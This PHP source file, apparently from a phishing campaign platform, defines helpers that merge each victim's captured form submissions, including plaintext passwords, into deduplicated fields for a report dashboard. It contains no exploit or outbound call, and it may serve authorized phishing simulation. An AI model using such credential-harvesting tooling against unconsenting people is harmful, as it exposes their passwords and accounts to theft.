<?php
// P3 — capture-field decoding for the report/dashboard projection. Collapses all
// of one victim's form submissions into a clean field map so the report shows
// ONE column per logical field and ONE row per victim — fixing the old bug where
// each Field-<name> value was pushed once per submission (email ×24, password ×8)
// with a duplicate column per landing page. Handles PLAINTEXT captured values
// (operator-tier display) — never log these; this only shapes them for display.

if (!function_exists('taphish_decode_capture_fields')) {
    /**
     * @param array $submissions list of per-submission field=>value maps (assoc
     *        arrays; objects should be cast to array by the caller), in
     *        chronological order across all pages for a single victim.
     * @return array<string, list<string>> field => DISTINCT non-empty values,
     *         first-seen order (usually one element).
     */
    function taphish_decode_capture_fields(array $submissions): array
    {
        $byField = [];
        foreach ($submissions as $sub) {
            if (!is_array($sub)) {
                continue;
            }
            foreach ($sub as $field => $value) {
                $s = is_scalar($value) ? trim((string) $value) : trim((string) json_encode($value));
                if ($s === '') {
                    continue;
                }
                if (!isset($byField[$field])) {
                    $byField[$field] = [];
                }
                if (!in_array($s, $byField[$field], true)) {
                    $byField[$field][] = $s;   // distinct, first-seen order
                }
            }
        }
        return $byField;
    }
}

if (!function_exists('taphish_capture_field_display')) {
    /**
     * Render a decoded field's distinct values as one cell. Multiple distinct
     * values (e.g. two different passwords tried) are comma-joined rather than
     * repeated N times.
     *
     * @param list<string> $values
     */
    function taphish_capture_field_display(array $values): string
    {
        return implode(', ', $values);
    }
}
